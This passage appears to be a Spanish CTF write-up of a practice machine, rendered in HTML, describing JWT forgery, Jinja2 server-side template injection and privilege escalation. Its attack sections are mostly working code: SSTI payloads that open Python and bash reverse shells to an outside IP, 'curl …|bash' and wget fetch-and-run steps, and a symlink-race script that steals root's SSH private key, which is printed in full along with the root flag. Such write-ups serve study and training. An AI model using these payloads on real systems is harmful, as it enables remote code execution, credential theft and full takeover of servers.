+<a id="__codelineno-6-78" name="__codelineno-6-78" href="#__codelineno-6-78"></a>            <span class="s1">&#39;body&#39;</span>: json.dumps<span class="o">(</span>str<span class="o">(</span>resp<span class="o">))</span> <span class="c1">#dynamodb tracking for CR-342</span>
+<a id="__codelineno-6-79" name="__codelineno-6-79" href="#__codelineno-6-79"></a>            <span class="o">}</span>
+<a id="__codelineno-6-80" name="__codelineno-6-80" href="#__codelineno-6-80"></a>        <span class="k">else</span>:
+<a id="__codelineno-6-81" name="__codelineno-6-81" href="#__codelineno-6-81"></a>            <span class="k">return</span> <span class="o">{</span>
+<a id="__codelineno-6-82" name="__codelineno-6-82" href="#__codelineno-6-82"></a>                <span class="s1">&#39;statusCode&#39;</span>: <span class="m">500</span>,
+<a id="__codelineno-6-83" name="__codelineno-6-83" href="#__codelineno-6-83"></a>                <span class="s1">&#39;body&#39;</span>: json.dumps<span class="o">(</span><span class="s1">&#39;Invalid Order ID&#39;</span><span class="o">)</span>
+<a id="__codelineno-6-84" name="__codelineno-6-84" href="#__codelineno-6-84"></a>            <span class="o">}</span>
+<a id="__codelineno-6-85" name="__codelineno-6-85" href="#__codelineno-6-85"></a>    except:
+<a id="__codelineno-6-86" name="__codelineno-6-86" href="#__codelineno-6-86"></a>        <span class="k">return</span> <span class="o">{</span>
+<a id="__codelineno-6-87" name="__codelineno-6-87" href="#__codelineno-6-87"></a>                <span class="s1">&#39;statusCode&#39;</span>: <span class="m">500</span>,
+<a id="__codelineno-6-88" name="__codelineno-6-88" href="#__codelineno-6-88"></a>                <span class="s1">&#39;body&#39;</span>: json.dumps<span class="o">(</span><span class="s1">&#39;Invalid Order ID&#39;</span><span class="o">)</span>
+<a id="__codelineno-6-89" name="__codelineno-6-89" href="#__codelineno-6-89"></a>            <span class="o">}</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1"># Con python3 generamos un jwt válido:</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">jwt</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="o">&gt;&gt;&gt;</span> <span class="n">encoded_jwt</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">({</span><span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s1">&#39;admin&#39;</span><span class="p">},</span> <span class="s1">&#39;RrXCv`mrNe!K!4+5`wYq&#39;</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s1">&#39;HS256&#39;</span><span class="p">)</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="o">&gt;&gt;&gt;</span> <span class="nb">print</span><span class="p">(</span><span class="n">encoded_jwt</span><span class="p">)</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="sa">b</span><span class="s1">&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8JUBz8oy5DlaoSmr0ffLb_hrdSHl0iLMGz-Ece7VNtg&#39;</span>
+</code></pre></div>
+<blockquote>
+<p><code>Se adjunta el token a la páquina que no teniamos autorización</code></p>
+</blockquote>
+<p><img alt="Conectividad OK" src="../images/jwt.png" title="Leyenda de la imagen" /></p>
+</li>
+</ul>
+<h2 id="ssti-server-side-template-injection">SSTI (Server Side Template Injection)</h2>
+<ul>
+<li>
+<p>El parámetro custome es vulnerable a SSTI:</p>
+<blockquote>
+<p><code>Se adjunta el token a la páquina que no teniamos autorización</code></p>
+</blockquote>
+<p><img alt="Conectividad OK" src="../images/ssti.png" /></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># Payload:</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="nv">costume</span><span class="o">={</span>% <span class="k">for</span> x <span class="k">in</span> <span class="o">()</span>.__class__.__base__.__subclasses__<span class="o">()</span> %<span class="o">}{</span>% <span class="k">if</span> <span class="s2">&quot;warning&quot;</span> <span class="k">in</span> x.__name__ %<span class="o">}{{</span>x<span class="o">()</span>._module.__builtins__<span class="o">[</span><span class="s1">&#39;__import__&#39;</span><span class="o">](</span><span class="s1">&#39;os&#39;</span><span class="o">)</span>.popen<span class="o">(</span><span class="s2">&quot;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.10.14.16\&quot;,4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/cat\&quot;, \&quot;/home/tom/user.txt\&quot;]);&#39;&quot;</span><span class="o">)</span>.read<span class="o">()</span>.zfill<span class="o">(</span><span class="m">417</span><span class="o">)}}{</span>%endif%<span class="o">}{</span>% endfor %<span class="o">}</span><span class="p">&amp;</span><span class="nv">q</span><span class="o">=</span>cccc<span class="p">&amp;</span><span class="nv">addr</span><span class="o">=</span>cccc
+</code></pre></div>
+</li>
+<li>
+<p>RCE - Forma de ejecutar una shell reversa:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1"># Descarga de script para ejecutar reverse shell (/bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.16/4443 0&gt;&amp;1&#39;) (nc -lvnp 4443 [para recibir la salida]) (python -m http.server 80 [servidor web con el script])</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="nv">costume</span><span class="o">={</span>% <span class="k">for</span> x <span class="k">in</span> <span class="o">()</span>.__class__.__base__.__subclasses__<span class="o">()</span> %<span class="o">}{</span>% <span class="k">if</span> <span class="s2">&quot;warning&quot;</span> <span class="k">in</span> x.__name__ %<span class="o">}{{</span>x<span class="o">()</span>._module.__builtins__<span class="o">[</span><span class="s1">&#39;__import__&#39;</span><span class="o">](</span><span class="s1">&#39;os&#39;</span><span class="o">)</span>.popen<span class="o">(</span><span class="s2">&quot;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.10.14.16\&quot;,4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/usr/bin/wget\&quot;, \&quot;http://10.10.14.16/xshell.sh\&quot;]);&#39;&quot;</span><span class="o">)</span>.read<span class="o">()</span>.zfill<span class="o">(</span><span class="m">417</span><span class="o">)}}{</span>%endif%<span class="o">}{</span>% endfor %<span class="o">}</span><span class="p">&amp;</span><span class="nv">q</span><span class="o">=</span>cccc<span class="p">&amp;</span><span class="nv">addr</span><span class="o">=</span>cccc
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="c1"># Servidor python http en el puerto 80 y ejecucion de reverse shell (nc -lvnp 4443)</span>
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="nv">costume</span><span class="o">={</span>% <span class="k">for</span> x <span class="k">in</span> <span class="o">()</span>.__class__.__base__.__subclasses__<span class="o">()</span> %<span class="o">}{</span>% <span class="k">if</span> <span class="s2">&quot;warning&quot;</span> <span class="k">in</span> x.__name__ %<span class="o">}{{</span>x<span class="o">()</span>._module.__builtins__<span class="o">[</span><span class="s1">&#39;__import__&#39;</span><span class="o">](</span><span class="s1">&#39;os&#39;</span><span class="o">)</span>.popen<span class="o">(</span><span class="s2">&quot;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.10.14.16\&quot;,80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/bash\&quot;, \&quot;xshell.sh\&quot;]);&#39;&quot;</span><span class="o">)</span>.read<span class="o">()</span>.zfill<span class="o">(</span><span class="m">417</span><span class="o">)}}{</span>%endif%<span class="o">}{</span>% endfor %<span class="o">}</span><span class="p">&amp;</span><span class="nv">q</span><span class="o">=</span>cccc<span class="p">&amp;</span><span class="nv">addr</span><span class="o">=</span>cccc
+</code></pre></div>
+</li>
+<li>
+<p>RCE Alternativa - Más simplificada:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="o">{{</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>self._TemplateReference__context.namespace.__init__.__globals__.os.popen<span class="o">(</span><span class="s1">&#39;id&#39;</span><span class="o">)</span>.read<span class="o">()</span>
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="o">}}</span>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="o">{{</span> self._TemplateReference__context.namespace.__init__.__globals__.os.system<span class="o">(</span><span class="s1">&#39;curl 10.10.14.15|bash&#39;</span><span class="o">)</span>.read<span class="o">()</span> <span class="o">}}</span>
+</code></pre></div>
+</li>
+</ul>
+<h2 id="escalate-privileges">Escalate privileges</h2>
+<ul>
+<li>
+<p>Monitorizando procesos con pspy64 se localiza un script que ciclicamente se ejecuta cada cierto tiempo con permisos de root:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>tom@epsilon:/tmp/var/www$ cat /usr/bin/backup.sh
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="c1">#!/bin/bash</span>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="nv">file</span><span class="o">=</span><span class="sb">`</span>date +%N<span class="sb">`</span>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>/usr/bin/rm -rf /opt/backups/*
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>/usr/bin/tar -cvf <span class="s2">&quot;/opt/backups/</span><span class="nv">$file</span><span class="s2">.tar&quot;</span> /var/www/app/
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>sha1sum <span class="s2">&quot;/opt/backups/</span><span class="nv">$file</span><span class="s2">.tar&quot;</span> <span class="p">|</span> cut -d <span class="s1">&#39; &#39;</span> -f1 &gt; /opt/backups/checksum
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>sleep <span class="m">5</span>
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="nv">check_file</span><span class="o">=</span><span class="sb">`</span>date +%N<span class="sb">`</span>
+<a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>/usr/bin/tar -chvf <span class="s2">&quot;/var/backups/web_backups/</span><span class="si">${</span><span class="nv">check_file</span><span class="si">}</span><span class="s2">.tar&quot;</span> /opt/backups/checksum <span class="s2">&quot;/opt/backups/</span><span class="nv">$file</span><span class="s2">.tar&quot;</span>
+<a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>/usr/bin/rm -rf /opt/backups/*
+</code></pre></div>
+</li>
+<li>
+<p>Exploit:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>tom@epsilon:/tmp$ cat escalador.sh 
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="c1">#!/bin/bash</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="k">while</span> true<span class="p">;</span> <span class="k">do</span>
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>    <span class="k">if</span> <span class="o">[</span> -e /opt/backups/checksum <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>        <span class="nb">echo</span> <span class="s2">&quot;[!] Mostrando backups actuales&quot;</span>
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>        ls -la /var/backups/web_backups/
+<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>        <span class="nb">echo</span> <span class="s2">&quot;[!] Borrando archivo checksum&quot;</span>
+<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>        rm -f /opt/backups/checksum
+<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>        <span class="nb">echo</span> <span class="s2">&quot;[!] Creando link simbolico a id_rsa de root&quot;</span>
+<a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>        ln -sf /root/.ssh/id_rsa /opt/backups/checksum
+<a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>        <span class="nb">echo</span> <span class="s2">&quot;[!] En 6 segundos vamos a revisar los últimos backups&quot;</span>
+<a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a>        sleep <span class="m">6</span>
+<a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a>        ls -la /var/backups/web_backups/
+<a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a>        <span class="nb">echo</span> <span class="s2">&quot;[!] Copia el último tiene sorpresa&quot;</span>
+<a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a>    <span class="k">fi</span>
+<a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a><span class="k">done</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>tom@epsilon:/tmp$ bash explotado.sh 
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="o">[</span>!<span class="o">]</span> Mostrando backups actuales
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>total <span class="m">2948</span>
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>drwxr-xr-x <span class="m">2</span> root root    <span class="m">4096</span> Sep  <span class="m">2</span> <span class="m">19</span>:17 .
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>drwxr-xr-x <span class="m">3</span> root root    <span class="m">4096</span> Feb  <span class="m">4</span>  <span class="m">2022</span> ..
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>-rw-r--r-- <span class="m">1</span> root root <span class="m">1003520</span> Sep  <span class="m">2</span> <span class="m">19</span>:15 <span class="m">002433377</span>.tar
+<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>-rw-r--r-- <span class="m">1</span> root root <span class="m">1003520</span> Sep  <span class="m">2</span> <span class="m">19</span>:16 <span class="m">027571548</span>.tar
+<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>-rw-r--r-- <span class="m">1</span> root root <span class="m">1003520</span> Sep  <span class="m">2</span> <span class="m">19</span>:17 <span class="m">063984736</span>.tar
+<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="o">[</span>!<span class="o">]</span> Borrando archivo checksum
+<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="o">[</span>!<span class="o">]</span> Creando link simbolico a id_rsa de root
+<a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="o">[</span>!<span class="o">]</span> En <span class="m">6</span> segundos vamos a revisar los últimos backups
+<a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a>total <span class="m">3928</span>
+<a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a>drwxr-xr-x <span class="m">2</span> root root    <span class="m">4096</span> Sep  <span class="m">2</span> <span class="m">19</span>:18 .
+<a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a>drwxr-xr-x <span class="m">3</span> root root    <span class="m">4096</span> Feb  <span class="m">4</span>  <span class="m">2022</span> ..
+<a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a>-rw-r--r-- <span class="m">1</span> root root <span class="m">1003520</span> Sep  <span class="m">2</span> <span class="m">19</span>:15 <span class="m">002433377</span>.tar
+<a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a>-rw-r--r-- <span class="m">1</span> root root <span class="m">1003520</span> Sep  <span class="m">2</span> <span class="m">19</span>:16 <span class="m">027571548</span>.tar
+<a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a>-rw-r--r-- <span class="m">1</span> root root <span class="m">1003520</span> Sep  <span class="m">2</span> <span class="m">19</span>:17 <span class="m">063984736</span>.tar
+<a id="__codelineno-13-18" name="__codelineno-13-18" href="#__codelineno-13-18"></a>-rw-r--r-- <span class="m">1</span> root root <span class="m">1003520</span> Sep  <span class="m">2</span> <span class="m">19</span>:18 <span class="m">109662329</span>.tar
+<a id="__codelineno-13-19" name="__codelineno-13-19" href="#__codelineno-13-19"></a><span class="o">[</span>!<span class="o">]</span> Copia el último tiene sorpresa
+<a id="__codelineno-13-20" name="__codelineno-13-20" href="#__codelineno-13-20"></a>
+<a id="__codelineno-13-21" name="__codelineno-13-21" href="#__codelineno-13-21"></a>tom@epsilon:/tmp$ cp /var/backups/web_backups/109662329.tar .
+<a id="__codelineno-13-22" name="__codelineno-13-22" href="#__codelineno-13-22"></a>
+<a id="__codelineno-13-23" name="__codelineno-13-23" href="#__codelineno-13-23"></a>tom@epsilon:/tmp$ tar xvf <span class="m">109662329</span>.tar
+<a id="__codelineno-13-24" name="__codelineno-13-24" href="#__codelineno-13-24"></a>    opt/backups/checksum
+<a id="__codelineno-13-25" name="__codelineno-13-25" href="#__codelineno-13-25"></a>    opt/backups/090647821.tar
+<a id="__codelineno-13-26" name="__codelineno-13-26" href="#__codelineno-13-26"></a>
+<a id="__codelineno-13-27" name="__codelineno-13-27" href="#__codelineno-13-27"></a>tom@epsilon:/tmp$ cat opt/backups/checksum 
+<a id="__codelineno-13-28" name="__codelineno-13-28" href="#__codelineno-13-28"></a>-----BEGIN OPENSSH PRIVATE KEY-----
+<a id="__codelineno-13-29" name="__codelineno-13-29" href="#__codelineno-13-29"></a>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+<a id="__codelineno-13-30" name="__codelineno-13-30" href="#__codelineno-13-30"></a>NhAAAAAwEAAQAAAYEA1w26V2ovmMpeSCDauNqlsPHLtTP8dI8HuQ4yGY3joZ9zT1NoeIdF
+<a id="__codelineno-13-31" name="__codelineno-13-31" href="#__codelineno-13-31"></a>16L/79L3nSFwAXdmUtrCIZuBNjXmRBMzp6euQjUPB/65yK9w8pieXewbWZ6lX1l6wHNygr
+<a id="__codelineno-13-32" name="__codelineno-13-32" href="#__codelineno-13-32"></a>QFacJOu4ju+vXI/BVB43mvqXXfgUQqmkY62gmImf4xhP4RWwHCOSU8nDJv2s2+isMeYIXE
+<a id="__codelineno-13-33" name="__codelineno-13-33" href="#__codelineno-13-33"></a>SB8l1wWP9EiPo0NWlJ8WPe2nziSB68vZjQS5yxLRtQvkSvpHBqW90frHWlpG1eXVK8S9B0
+<a id="__codelineno-13-34" name="__codelineno-13-34" href="#__codelineno-13-34"></a>1PuEoxQjS0fNASZ2zhG8TJ1XAamxT3YuOhX2K6ssH36WVYSLOF/2KDlZsbJyxwG0V8QkgF
+<a id="__codelineno-13-35" name="__codelineno-13-35" href="#__codelineno-13-35"></a>u0DPZ0V8ckuh0o+Lm64PFXlSyOFcb/1SU/wwid4i9aYzhNOQOxDSPh2vmXxPDkB0/dLAO6
+<a id="__codelineno-13-36" name="__codelineno-13-36" href="#__codelineno-13-36"></a>wBlOakYszruVLMkngP89QOKLIGasmzIU816KKufUdLSFczig96aVRxeFcVAHgi1ry1O7Tr
+<a id="__codelineno-13-37" name="__codelineno-13-37" href="#__codelineno-13-37"></a>oCIJewhvsh8I/kemAhNHjwt3imGulUmlIw/s1cpdAAAFiAR4Z9EEeGfRAAAAB3NzaC1yc2
+<a id="__codelineno-13-38" name="__codelineno-13-38" href="#__codelineno-13-38"></a>EAAAGBANcNuldqL5jKXkgg2rjapbDxy7Uz/HSPB7kOMhmN46Gfc09TaHiHRdei/+/S950h
+<a id="__codelineno-13-39" name="__codelineno-13-39" href="#__codelineno-13-39"></a>cAF3ZlLawiGbgTY15kQTM6enrkI1Dwf+ucivcPKYnl3sG1mepV9ZesBzcoK0BWnCTruI7v
+<a id="__codelineno-13-40" name="__codelineno-13-40" href="#__codelineno-13-40"></a>r1yPwVQeN5r6l134FEKppGOtoJiJn+MYT+EVsBwjklPJwyb9rNvorDHmCFxEgfJdcFj/RI
+<a id="__codelineno-13-41" name="__codelineno-13-41" href="#__codelineno-13-41"></a>j6NDVpSfFj3tp84kgevL2Y0EucsS0bUL5Er6RwalvdH6x1paRtXl1SvEvQdNT7hKMUI0tH
+<a id="__codelineno-13-42" name="__codelineno-13-42" href="#__codelineno-13-42"></a>zQEmds4RvEydVwGpsU92LjoV9iurLB9+llWEizhf9ig5WbGycscBtFfEJIBbtAz2dFfHJL
+<a id="__codelineno-13-43" name="__codelineno-13-43" href="#__codelineno-13-43"></a>odKPi5uuDxV5UsjhXG/9UlP8MIneIvWmM4TTkDsQ0j4dr5l8Tw5AdP3SwDusAZTmpGLM67
+<a id="__codelineno-13-44" name="__codelineno-13-44" href="#__codelineno-13-44"></a>lSzJJ4D/PUDiiyBmrJsyFPNeiirn1HS0hXM4oPemlUcXhXFQB4Ita8tTu066AiCXsIb7If
+<a id="__codelineno-13-45" name="__codelineno-13-45" href="#__codelineno-13-45"></a>CP5HpgITR48Ld4phrpVJpSMP7NXKXQAAAAMBAAEAAAGBAMULlg7cg8oaurKaL+6qoKD1nD
+<a id="__codelineno-13-46" name="__codelineno-13-46" href="#__codelineno-13-46"></a>Jm9M2T9H6STENv5//CSvSHNzUgtVT0zE9hXXKDHc6qKX6HZNNIWedjEZ6UfYMDuD5/wUsR
+<a id="__codelineno-13-47" name="__codelineno-13-47" href="#__codelineno-13-47"></a>EgeZAQO35XuniBPgsiQgp8HIxkaOTltuJ5fbyyT1qfeYPqwAZnz+PRGDdQmwieIYVCrNZ3
+<a id="__codelineno-13-48" name="__codelineno-13-48" href="#__codelineno-13-48"></a>A1H4/kl6KmxNdVu3mfhRQ93gqQ5p0ytQhE13b8OWhdnepFriqGJHhUqRp1yNtWViqFDtM1
+<a id="__codelineno-13-49" name="__codelineno-13-49" href="#__codelineno-13-49"></a>lzNACW5E1R2eC6V1DGyWzcKVvizzkXOBaD9LOAkd6m9llkrep4QJXDNtqUcDDJdYrgOiLd
+<a id="__codelineno-13-50" name="__codelineno-13-50" href="#__codelineno-13-50"></a>/Ghihu64/9oj0qxyuzF/5B82Z3IcA5wvdeGEVhhOWtEHyCJijDLxKxROuBGl6rzjxsMxGa
+<a id="__codelineno-13-51" name="__codelineno-13-51" href="#__codelineno-13-51"></a>gvpMXgUQPvupFyOapnSv6cfGfrUTKXSUwB2qXkpPxs5hUmNjixrDkIRZmcQriTcMmqGIz3
+<a id="__codelineno-13-52" name="__codelineno-13-52" href="#__codelineno-13-52"></a>2uzGlUx4sSMmovkCIXMoMSHa7BhEH2WHHCQt6nvvM+m04vravD4GE5cRaBibwcc2XWHQAA
+<a id="__codelineno-13-53" name="__codelineno-13-53" href="#__codelineno-13-53"></a>AMEAxHVbgkZfM4iVrNteV8+Eu6b1CDmiJ7ZRuNbewS17e6EY/j3htNcKsDbJmSl0Q0HqqP
+<a id="__codelineno-13-54" name="__codelineno-13-54" href="#__codelineno-13-54"></a>mwGi6Kxa5xx6tKeA8zkYsS6bWyDmcpLXKC7+05ouhDFddEHwBjlCck/kPW1pCnWHuyjOm9
+<a id="__codelineno-13-55" name="__codelineno-13-55" href="#__codelineno-13-55"></a>eXdBDDwA5PUF46vbkY1VMtsiqI2bkDr2r3PchrYQt/ZZq9bq6oXlUYc/BzltCtdJFAqLg5
+<a id="__codelineno-13-56" name="__codelineno-13-56" href="#__codelineno-13-56"></a>8WBZSBDdIUoFba49ZnwxtzBClMVKTVoC9GaOBjLa3SUVDukw/GAAAAwQD0scMBrfeuo9CY
+<a id="__codelineno-13-57" name="__codelineno-13-57" href="#__codelineno-13-57"></a>858FwSw19DwXDVzVSFpcYbV1CKzlmMHtrAQc+vPSjtUiD+NLOqljOv6EfTGoNemWnhYbtv
+<a id="__codelineno-13-58" name="__codelineno-13-58" href="#__codelineno-13-58"></a>wHPJO6Sx4DL57RPiH7LOCeLX4d492hI0H6Z2VN6AA50BywjkrdlWm3sqJdt0BxFul6UIJM
+<a id="__codelineno-13-59" name="__codelineno-13-59" href="#__codelineno-13-59"></a>04vqf3TGIQh50EALanN9wgLWPSvYtjZE8uyauSojTZ1Kc3Ww6qe21at8I4NhTmSq9HcK+T
+<a id="__codelineno-13-60" name="__codelineno-13-60" href="#__codelineno-13-60"></a>KmGDLbEOX50oa2JFH2FCle7XYSTWbSQ9sAAADBAOD9YEjG9+6xw/6gdVr/hP/0S5vkvv3S
+<a id="__codelineno-13-61" name="__codelineno-13-61" href="#__codelineno-13-61"></a>527afi2HYZYEw4i9UqRLBjGyku7fmrtwytJA5vqC5ZEcjK92zbyPhaa/oXfPSJsYk05Xjv
+<a id="__codelineno-13-62" name="__codelineno-13-62" href="#__codelineno-13-62"></a>6wA2PLxVv9Xj5ysC+T5W7CBUvLHhhefuCMlqsJNLOJsAs9CSqwCIWiJlDi8zHkitf4s6Jp
+<a id="__codelineno-13-63" name="__codelineno-13-63" href="#__codelineno-13-63"></a>Z8Y4xSvJMmb4XpkDMK464P+mve1yxQMyoBJ55BOm7oihut9st3Is4ckLkOdJxSYhIS46bX
+<a id="__codelineno-13-64" name="__codelineno-13-64" href="#__codelineno-13-64"></a><span class="nv">BqhGglrHoh2JycJwAAAAxyb290QGVwc2lsb24BAgMEBQ</span><span class="o">==</span>
+<a id="__codelineno-13-65" name="__codelineno-13-65" href="#__codelineno-13-65"></a>-----END OPENSSH PRIVATE KEY-----
+<a id="__codelineno-13-66" name="__codelineno-13-66" href="#__codelineno-13-66"></a>
+<a id="__codelineno-13-67" name="__codelineno-13-67" href="#__codelineno-13-67"></a>tom@epsilon:/tmp/opt/backups$ chmod <span class="m">600</span> checksum 
+<a id="__codelineno-13-68" name="__codelineno-13-68" href="#__codelineno-13-68"></a>tom@epsilon:/tmp/opt/backups$ ssh root@localhost -i checksum
+<a id="__codelineno-13-69" name="__codelineno-13-69" href="#__codelineno-13-69"></a>root@epsilon:~# cat /root/root.txt 
+<a id="__codelineno-13-70" name="__codelineno-13-70" href="#__codelineno-13-70"></a>c2c9bb669159cbdabb8d2ee4f2e377df
+</code></pre></div>
+</li>
+</ul>
+
+              
+            </article>
+            
+          </div>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+    <nav class="md-footer__inner md-grid" aria-label="Footer" >
+      
+        
+        <a href="../chainsaw/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Chainsaw" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              Chainsaw
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../flustered/" class="md-footer__link md-footer__link--next" aria-label="Next: Flustered" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              Flustered
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
